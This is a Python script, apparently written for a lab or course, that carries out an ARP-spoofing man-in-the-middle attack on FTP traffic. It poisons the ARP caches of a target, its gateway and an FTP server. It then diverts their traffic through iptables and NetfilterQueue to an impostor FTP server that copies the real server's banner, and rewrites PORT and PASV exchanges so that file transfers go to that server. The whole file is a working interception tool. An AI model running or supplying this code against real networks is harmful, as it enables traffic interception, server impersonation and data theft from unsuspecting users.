import re
import signal
import subprocess
import sys
import os
import time
from ipaddress import ip_network
from multiprocessing import Event, Manager, Process
from ftplib import FTP

from netfilterqueue import NetfilterQueue
from pyftpdlib.authorizers import DummyAuthorizer
from pyftpdlib.handlers import FTPHandler
from pyftpdlib.servers import FTPServer
from scapy.all import ARP, IP, TCP, Ether, send, srp

# Configuration
mitm_ip = "10.1.1.2"
gateway_ip = "10.1.1.1"
ftp_ip = "10.1.2.2"
target_ip = "10.1.1.3"
interface_name = "eth0"

# More configuration, that most likely won't need to be meddled
username = os.environ.get("SUDO_USER", os.environ.get("USERNAME"))
home_dir = os.path.expanduser(f"~{username}")
mitm_ftp_serve_directory = home_dir + os.path.sep + "ftp"
mitm_ftp_port = 2121
ftp_port = 21
netmask = 24

# Global variables
ftp_pasv_data_port = Manager().dict()
ftp_active_data_port = Manager().dict()
arp_mappings = Manager().dict()
incoming_nfqueue = None
outgoing_nfqueue = None
STOP_EVENT = Event()  # Event to signal the end of the program
arpspoof_procs = []


def init_os_config():
    """Boring admin things to handle before running the program"""
    # ip_forward is enabled
    subprocess.check_output(["sysctl", "-w", "net.ipv4.ip_forward=1"])

    flush_iptable_rules()
    # add iptables allow forwarding traffic
    subprocess.check_output(
        [
            "iptables",
            "-t",
            "mangle",
            "-A",
            "FORWARD",
            "-i",
            interface_name,
            "-j",
            "TTL",
            "--ttl-inc",
            "1",
        ]
    )
    subprocess.check_output(["iptables", "--policy", "FORWARD", "ACCEPT"])
    subprocess.check_output(
        [
            "iptables",
            "-t",
            "mangle",
            "-A",
            "OUTPUT",
            "-p",
            "icmp",
            "--icmp-type",
            "5",
            "-j",
            "DROP",
        ]
    )

    # iptables to route traffic to nfqueue
    add_iptable_rules()


def cleanup():
    if incoming_nfqueue:
        incoming_nfqueue.unbind()

    if outgoing_nfqueue:
        outgoing_nfqueue.unbind()

    flush_iptable_rules()

    STOP_EVENT.set()
    print("Rearping targets")
    for t in arpspoof_procs:
        t.join()


def sigint_handler(a, b):
    cleanup()
    sys.exit()


def start_ftp_server(banner):
    """Starts the FTP server using pyftpd"""
    authorizer = DummyAuthorizer()
    authorizer.add_anonymous(mitm_ftp_serve_directory)

    handler = FTPHandler
    handler.authorizer = authorizer
    handler.banner = banner

    # listen on every IP on my machine on port 21
    address = ("0.0.0.0", mitm_ftp_port)
    server = FTPServer(address, handler)
    Process(target=server.serve_forever, daemon=True).start()


def is_same_network(IP1, IP2):
    return (
        ip_network(IP1, strict=False).network_address
        == ip_network(IP2, strict=False).network_address
    )


def get_mac(ip):
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = srp(
        arp_request_broadcast, timeout=5, verbose=False, iface=interface_name
    )[0]
    if len(answered_list) > 0:
        return answered_list[0][1].hwsrc

    return None


def arpspoof_wrapper():
    # Some logic to determine who to spoof
    if is_same_network(f"{target_ip}/{netmask}", f"{ftp_ip}/{netmask}"):
        t = Process(
            target=start_arpspoof, args=(target_ip, ftp_ip, STOP_EVENT, arp_mappings)
        )
        arpspoof_procs.append(t)

    t1 = Process(
        target=start_arpspoof, args=(gateway_ip, target_ip, STOP_EVENT, arp_mappings)
    )
    t2 = Process(
        target=start_arpspoof, args=(target_ip, gateway_ip, STOP_EVENT, arp_mappings)
    )
    arpspoof_procs.append(t1)
    arpspoof_procs.append(t2)

    for t in arpspoof_procs:
        t.start()


def start_arpspoof(target, spoof, event, arp_mappings):
    if target == spoof:
        return

    if not arp_mappings.get(target, None):
        arp_mappings[target] = get_mac(target)

    target_mac = arp_mappings[target]

    if not target_mac:
        return

    while not event.is_set():
        try:
            packet = ARP(op=2, pdst=target, hwdst=target_mac, psrc=spoof)
            send(packet, verbose=False)
            time.sleep(1)
        except KeyboardInterrupt:
            continue

    # REARP
    actual_spoof_mac = arp_mappings.get(spoof, None)
    if not actual_spoof_mac:
        return

    no_of_rearp_packets = 5
    for i in range(no_of_rearp_packets):
        packet = ARP(
            op=2, pdst=target, hwdst=target_mac, psrc=spoof, hwsrc=actual_spoof_mac
        )
        send(packet, verbose=False)
        time.sleep(1)


def add_iptable_rules():
    """Add the relevant netfilterqueue rules to iptables"""
    subprocess.check_output(
        [
            "iptables",
            "-t",
            "mangle",
            "-A",
            "PREROUTING",
            "-p",
            "tcp",
            "-i",
            interface_name,
            "-j",
            "NFQUEUE",
            "--queue-num",
            "1",
            "--source",
            target_ip,
            "--destination",
            ftp_ip,
        ]
    )
    subprocess.check_output(
        [
            "iptables",
            "-t",
            "mangle",
            "-A",
            "POSTROUTING",
            "-o",
            interface_name,
            "-j",
            "ACCEPT",
            "--source",
            mitm_ip,
            "--destination",
            target_ip,
            "-p",
            "tcp",
            "-m",
            "multiport",
            "--sports",
            "8080",
        ]
    )
    subprocess.check_output(
        [
            "iptables",
            "-t",
            "mangle",
            "-A",
            "POSTROUTING",
            "-p",
            "tcp",
            "-o",
            interface_name,
            "-j",
            "NFQUEUE",
            "--queue-num",
            "2",
            "--source",
            mitm_ip,
            "--destination",
            target_ip,
        ]
    )


def flush_iptable_rules():
    print("Flushing IPTable mangle table")
    subprocess.check_output(["iptables", "--table", "mangle", "--flush"])


def to_intercept_incoming(pkt):
    """Conditions
    1. Destination port = FTP-Data or Real FTP Port
    2. Destination IP = Real FTP IP
    3. Source port = FTP-Data port"""

    # Preliminary filtering
    if IP not in pkt or TCP not in pkt:
        return False

    return pkt[IP].dst == ftp_ip and (
        pkt[TCP].dport == ftp_port
        or pkt[TCP].dport in ftp_pasv_data_port
        or pkt[TCP].sport in ftp_active_data_port
    )


def incoming(packet):
    """Intercepts all incoming packets"""
    pkt = IP(packet.get_payload())
    print("Raw incoming: ", pkt.summary())

    if not to_intercept_incoming(pkt):
        # "Forwards" the packet normally
        if IP in pkt and pkt[IP].dst != mitm_ip:
            pkt[IP].ttl = pkt[IP].ttl + 1
            pkt[IP].len = None
            pkt[IP].chksum = None

            packet.set_payload(bytes(pkt))
        packet.accept()
        return

    # Guaranteed to have both TCP and IP in layer
    process_incoming_ftp_packet(pkt)
    pkt[IP].dst = mitm_ip

    if pkt[TCP].dport == ftp_port:
        pkt[TCP].dport = mitm_ftp_port
    elif pkt[TCP].flags.F:
        if pkt[TCP].dport in ftp_pasv_data_port:
            ftp_pasv_data_port[pkt[TCP].dport] = 1

        if pkt[TCP].sport in ftp_active_data_port:
            ftp_active_data_port[pkt[TCP].sport] = 1

    pkt[IP].len = None
    pkt[IP].chksum = None
    pkt[TCP].chksum = None

    print("Modified: ", pkt.summary())
    packet.set_payload(bytes(pkt))
    packet.accept()


def calculate_ftp_port(port):
    calculated_port = list(map(int, port.split(",")))
    return calculated_port[0] * 256 + calculated_port[1]


def process_incoming_ftp_packet(pkt):
    """Modifies the ftp packet such that it points to the MiTM"""
    if TCP not in pkt:
        return

    if not pkt[TCP].payload:
        return

    content = pkt[TCP].load.decode().strip()
    # It just works
    print(content)
    regex = r"PORT [\d]{1,3},[\d]{1,3},[\d]{1,3},[\d]{1,3},([\d]{1,3},[\d]{1,3})"
    result = re.match(regex, content)
    if not result:
        return

    port = result.group(1)

    calculated_port = calculate_ftp_port(port)
    ftp_active_data_port[calculated_port] = 0


def process_outgoing_ftp_packet(pkt):
    """Modifies the ftp packet such that it points to the MiTM"""
    if TCP not in pkt:
        return

    if not pkt[TCP].payload:
        return

    content = pkt[TCP].load.decode().strip()
    # It just works
    regex = r"227 Entering passive mode \([\d]{1,3},[\d]{1,3},[\d]{1,3},[\d]{1,3},([\d]{1,3},[\d]{1,3})\)"
    result = re.match(regex, content)
    if not result:
        return

    ip = ftp_ip.replace(".", ",")
    port = result.group(1)

    calculated_port = list(map(int, port.split(",")))
    calculated_port = calculated_port[0] * 256 + calculated_port[1]
    ftp_pasv_data_port[calculated_port] = 0
    content = f"227 Entering passive mode ({ip},{port})"
    pkt[TCP].remove_payload()
    pkt[TCP].add_payload(content)


def to_intercept_outgoing(pkt):
    """Conditions
    1. Source port = FTP-Data or MITM FTP Port
    2. Destination port = FTP-Data (active)
    3. Source IP = MITM FTP IP"""

    # Preliminary filtering
    if IP not in pkt or TCP not in pkt:
        return False

    return pkt[IP].src == mitm_ip and (
        pkt[TCP].sport == mitm_ftp_port
        or pkt[TCP].sport in ftp_pasv_data_port
        or pkt[TCP].dport in ftp_active_data_port
    )


def outgoing(packet):
    """Intercepts all outgoing traffic handler"""
    pkt = IP(packet.get_payload())
    print("Outgoing: ", pkt.summary())
    print(f"Active: {ftp_active_data_port}")
    print(f"Passive: {ftp_pasv_data_port}")

    if not to_intercept_outgoing(pkt):
        packet.accept()
        return

    # Guaranteed to have both TCP and IP in the packet
    pkt[IP].src = ftp_ip

    if pkt[TCP].sport == mitm_ftp_port:
        pkt[TCP].sport = ftp_port
        process_outgoing_ftp_packet(pkt)
    elif ftp_pasv_data_port.get(pkt[TCP].sport, None):
        del ftp_pasv_data_port[pkt[TCP].sport]
    elif ftp_active_data_port.get(pkt[TCP].dport, None):
        del ftp_active_data_port[pkt[TCP].dport]

    pkt[IP].len = None
    pkt[IP].chksum = None
    pkt[TCP].chksum = None

    print("Modified: ", pkt.summary())
    packet.set_payload(bytes(pkt))
    packet.accept()


def ftp_banner_grab():
    try:
        with FTP(ftp_ip) as ftp_connection:
            return ftp_connection.getwelcome()
    except Exception:
        pass
    return "(Sibei Secure FTPd 0.0.1)"


def main():
    banner = ftp_banner_grab()
    start_ftp_server(banner)

    arpspoof_wrapper()

    init_os_config()

    # Netfilter Interception
    global incoming_nfqueue, outgoing_nfqueue
    incoming_nfqueue = NetfilterQueue()
    incoming_nfqueue.bind(1, incoming)
    outgoing_nfqueue = NetfilterQueue()
    outgoing_nfqueue.bind(2, outgoing)

    def run_nfqueue(nfqueue):
        try:
            nfqueue.run()
        except KeyboardInterrupt:
            pass

    Process(target=run_nfqueue, args=(incoming_nfqueue,), daemon=True).start()
    Process(target=run_nfqueue, args=(outgoing_nfqueue,), daemon=True).start()

    signal.signal(signal.SIGINT, sigint_handler)
    signal.pause()


if __name__ == "__main__":
    main()
